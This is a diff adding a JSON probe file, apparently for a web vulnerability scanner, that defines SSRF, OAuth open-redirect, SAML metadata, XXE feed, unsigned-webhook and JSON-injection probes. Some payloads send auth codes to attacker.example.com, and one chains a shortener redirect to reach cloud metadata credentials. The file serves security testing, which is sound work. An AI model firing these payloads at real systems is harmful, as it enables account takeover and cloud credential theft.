@@ -1,0 +1,136 @@
+{
+  "category": "unsafe_consumption",
+  "contexts": {
+    "open_webhook_url_attacker_controlled": {
+      "description": "Endpoint accepts attacker-supplied webhook URL and the server POSTs to it -- classic SSRF/exfil vector, often hidden behind 'integrations' / 'notifications'",
+      "tech_match": [],
+      "param_match": ["webhook_url", "webhook", "callback_url", "callback", "notify_url", "postback_url", "endpoint", "url"],
+      "probes": [
+        {
+          "payload": "https://{{collaborator}}/webhook",
+          "description": "Set webhook to Collaborator -- if interaction received with server's IP, outbound is attacker-controlled (SSRF + data-exfil through partner-callback shape)",
+          "matchers": [
+            {"type": "collaborator", "interaction_types": ["http", "dns"]},
+            {"type": "status", "status": [200, 201, 202, 204]}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
+    },
+    "third_party_response_trust_no_validation": {
+      "description": "Server fetches from third-party API and reflects response into the user's session without sanitization (geocoding, image proxy, link unfurl, social embed) -- attacker controls the upstream content via spoofed redirect target",
+      "tech_match": [],
+      "param_match": ["url", "src", "image_url", "avatar_url", "preview_url", "embed_url", "link", "unfurl"],
+      "probes": [
+        {
+          "payload": "https://{{collaborator}}/payload.json",
+          "description": "Point image/link unfurl at attacker host -- if Collaborator sees the fetch, server makes outbound. Then inspect target response for whether attacker content reflects back (SSRF chain to stored XSS / SSRF to internal asset).",
+          "matchers": [
+            {"type": "collaborator", "interaction_types": ["http", "dns"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "oauth_callback_origin_trust": {
+      "description": "OAuth callback handler trusts `state` / `next_url` / `return_to` without origin check -- attacker-supplied URL receives the auth code or session token",
+      "tech_match": ["OAuth", "OIDC", "OmniAuth", "Passport", "Spring Security"],
+      "param_match": ["next_url", "return_to", "redirect_url", "state", "RelayState", "continue", "callback_url"],
+      "probes": [
+        {
+          "payload": "https://attacker.example.com/grab",
+          "description": "Supply external URL in next/return param -- 302 with external Location = OAuth-callback redirect open. Pair with PKCE-reuse or state-reuse for ATO chain.",
+          "matchers": [
+            {"type": "status", "status": [302, 303]},
+            {"type": "header", "name": "Location", "contains": "attacker.example.com"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60
+        }
+      ]
+    },
+    "partner_redirect_chain_ssrf": {
+      "description": "Server uses partner-API URL that redirects back into internal infra (CDN, asset-resolver, link-shortener) -- attacker uses partner's open-redirect to reach internal targets the WAF didn't expect",
+      "tech_match": [],
+      "param_match": ["url", "redirect", "image_url", "asset_url", "src"],
+      "probes": [
+        {
+          "payload": "https://t.co/?redirect=http://169.254.169.254/latest/meta-data/",
+          "description": "Use known partner shortener that follows redirects -- if server follows the chain, it reaches cloud metadata. Try common shorteners: bit.ly, t.co, tinyurl, goo.gl, ow.ly.",
+          "matchers": [
+            {"type": "word", "words": ["ami-id", "instance-id", "iam/security-credentials", "metadata", "computeMetadata"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        }
+      ]
+    },
+    "saml_idp_trust_no_signature_check": {
+      "description": "SAML responder accepts unsigned assertion or trusts attacker-controlled IdP metadata URL -- supply attacker IdP, attacker forges assertion for any user",
+      "tech_match": ["SAML", "Shibboleth", "OneLogin", "SimpleSAMLphp"],
+      "param_match": ["SAMLResponse", "RelayState", "idp_metadata_url", "metadata_url"],
+      "probes": [
+        {
+          "payload": "https://{{collaborator}}/idp-metadata.xml",
+          "description": "Provide attacker metadata URL -- if Collaborator sees a fetch, SP downloads attacker IdP metadata = SAML federation hijack",
+          "matchers": [
+            {"type": "collaborator", "interaction_types": ["http", "dns"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        }
+      ]
+    },
+    "rss_atom_feed_xxe": {
+      "description": "Server consumes user-supplied feed URL (RSS reader, podcast importer, OPML import) -- attacker hosts XML with XXE/SSRF/billion-laughs payload",
+      "tech_match": [],
+      "param_match": ["feed_url", "rss_url", "opml", "feed", "podcast_url"],
+      "probes": [
+        {
+          "payload": "https://{{collaborator}}/feed.xml",
+          "description": "Attacker hosts XML referencing external entity -- if server fetches AND parses XML libraries with external-entities enabled, XXE chain available",
+          "matchers": [
+            {"type": "collaborator", "interaction_types": ["http", "dns"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
+    },
+    "webhook_signature_trust_no_origin_check": {
+      "description": "Incoming webhook (Stripe, Twilio, GitHub, Slack) accepted from any IP -- attacker forges webhook body if HMAC secret leaks OR if signature header is unchecked",
+      "tech_match": ["Stripe", "Twilio", "SendGrid", "GitHub", "Slack", "Shopify"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline_without_signature_header}}",
+          "description": "Replay webhook body with the Stripe-Signature / X-Hub-Signature header removed -- 200 = signature unchecked, anyone can forge webhook events",
+          "matchers": [
+            {"type": "status", "status": [200, 202]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        }
+      ]
+    },
+    "json_response_field_injection_via_upstream": {
+      "description": "Server returns upstream JSON wrapped without escaping -- if attacker controls upstream (DNS poison, link-unfurl, social-embed), they inject keys that override caller's auth context downstream",
+      "tech_match": [],
+      "param_match": ["url", "embed_url", "preview_url", "callback_url"],
+      "probes": [
+        {
+          "payload": "https://{{collaborator}}/poison.json",
+          "description": "Host upstream JSON with extra keys like `is_admin:true`, `role:\"admin\"`, `user_id:1` -- if server reflects upstream JSON verbatim into its own response, downstream consumers may trust forged fields",
+          "matchers": [
+            {"type": "collaborator", "interaction_types": ["http", "dns"]},
+            {"type": "word", "words": ["is_admin", "role", "admin"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    }
+  }
+}
